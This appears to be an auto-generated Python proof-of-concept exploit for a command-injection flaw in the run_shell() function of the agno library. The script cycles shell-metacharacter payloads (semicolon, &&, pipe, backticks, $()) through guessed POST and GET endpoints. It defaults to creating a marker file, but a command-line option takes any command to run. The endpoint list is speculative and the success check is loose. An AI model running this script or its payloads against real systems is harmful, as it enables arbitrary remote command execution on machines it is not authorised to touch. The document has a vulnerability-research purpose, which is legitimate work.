#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: rce-025
# Sink: run_shell
# Auto-generated — run with: python3 rce_inject_arbitrary_commands_run_shell.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for agno RCE vulnerability (CVE-2024-XXXXX).

Vulnerability: Command injection in run_shell() function.
The function uses subprocess.run() with shell=True and passes the command
string directly without sanitization against shell metacharacters.
The _check_command() method only checks for path traversal, not command injection.

Impact: An attacker can inject arbitrary shell commands using metacharacters
like ;, &&, |, etc.

This PoC demonstrates the vulnerability by executing a benign payload
that creates a marker file in /tmp.
"""

import argparse
import sys
import json
import urllib.request
import urllib.error
import urllib.parse

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000"

def exploit(target_url, command="touch /tmp/poc_success.txt"):
    """
    Attempt to exploit the command injection vulnerability.
    
    The vulnerability exists in the run_shell() function which executes
    shell commands via subprocess.run() with shell=True. The command
    parameter is passed directly without sanitization against shell
    metacharacters.
    
    We inject our payload using shell metacharacters (; or &&) to execute
    arbitrary commands after the intended command.
    """
    
    # The vulnerable endpoint typically accepts a "command" parameter
    # We inject our payload using shell metacharacters
    # The original command might be something like "ls" or "echo test"
    # We append our malicious command after a semicolon
    
    # Common injection patterns:
    # 1. Using semicolon: ; <malicious_command>
    # 2. Using &&: && <malicious_command>
    # 3. Using pipe: | <malicious_command>
    
    # We'll try multiple injection patterns
    payloads = [
        f"; {command}",
        f"&& {command}",
        f"| {command}",
        f"`{command}`",
        f"$({command})",
    ]
    
    # Try to find the vulnerable endpoint
    # Common endpoints in agno coding tools
    endpoints = [
        "/api/run_shell",
        "/api/coding/run_shell",
        "/api/tools/run_shell",
        "/run_shell",
        "/coding/run_shell",
        "/tools/run_shell",
        "/api/v1/run_shell",
        "/api/v1/coding/run_shell",
    ]
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload command: {command}")
    print()
    
    for endpoint in endpoints:
        full_url = target_url.rstrip('/') + endpoint
        
        for i, payload in enumerate(payloads, 1):
            print(f"[*] Trying payload {i}/{len(payloads)}: {payload}")
            
            # Prepare the request data
            # The vulnerable function expects a 'command' parameter
            data = {
                "command": payload,
                "timeout": 30
            }
            
            # Encode the data
            json_data = json.dumps(data).encode('utf-8')
            
            try:
                # Create the request
                req = urllib.request.Request(
                    full_url,
                    data=json_data,
                    headers={
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    method='POST'
                )
                
                # Send the request
                with urllib.request.urlopen(req, timeout=10) as response:
                    response_data = response.read().decode('utf-8')
                    status_code = response.getcode()
                    
                    print(f"    Status: {status_code}")
                    print(f"    Response: {response_data[:500]}...")
                    
                    # Check if our command was executed
                    # The response might contain output from our injected command
                    if "poc_success" in response_data.lower() or "success" in response_data.lower():
                        print(f"\n[!] SUCCESS! Command injection confirmed!")
                        print(f"[!] Payload: {payload}")
                        print(f"[!] Endpoint: {full_url}")
                        return True
                    
            except urllib.error.HTTPError as e:
                print(f"    HTTP Error: {e.code} - {e.reason}")
                try:
                    error_body = e.read().decode('utf-8')
                    print(f"    Error body: {error_body[:200]}")
                except:
                    pass
                    
            except urllib.error.URLError as e:
                print(f"    URL Error: {e.reason}")
                
            except Exception as e:
                print(f"    Error: {str(e)}")
    
    # If we didn't find the endpoint directly, try a more generic approach
    # The vulnerability might be accessible through other means
    print("\n[*] Trying alternative approach - direct command injection via GET parameters")
    
    for endpoint in endpoints:
        full_url = target_url.rstrip('/') + endpoint
        
        # Try GET request with command parameter
        params = urllib.parse.urlencode({"command": f"; {command}"})
        get_url = f"{full_url}?{params}"
        
        try:
            req = urllib.request.Request(get_url)
            with urllib.request.urlopen(req, timeout=10) as response:
                response_data = response.read().decode('utf-8')
                print(f"    GET Response: {response_data[:500]}")
                
                if "poc_success" in response_data.lower():
                    print(f"\n[!] SUCCESS! Command injection confirmed via GET!")
                    return True
                    
        except Exception as e:
            print(f"    GET Error: {str(e)}")
    
    print("\n[-] Exploit attempt completed. Check if the marker file was created:")
    print(f"    ls -la /tmp/poc_success.txt")
    print("\n    If the file exists, the vulnerability is confirmed.")
    print("    If not, the target may not be vulnerable or the endpoint differs.")
    
    return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for agno RCE vulnerability in run_shell()"
    )
    parser.add_argument(
        "-t", "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "-c", "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("agno RCE Exploit PoC")
    print("Vulnerability: Command injection in run_shell()")
    print("=" * 60)
    print()
    
    # Validate the command is safe (benign by default)
    if "rm" in args.command or "dd" in args.command or "mkfs" in args.command:
        print("[!] WARNING: Potentially destructive command detected!")
        print("[!] This PoC should only use benign commands.")
        response = input("Continue anyway? (y/N): ")
        if response.lower() != 'y':
            print("Exiting.")
            sys.exit(1)
    
    success = exploit(args.target, args.command)
    
    if success:
        print("\n[!] Vulnerability confirmed!")
        sys.exit(0)
    else:
        print("\n[-] Could not confirm vulnerability.")
        print("[-] The target may not be vulnerable or the endpoint differs.")
        sys.exit(1)

if __name__ == "__main__":
    main()
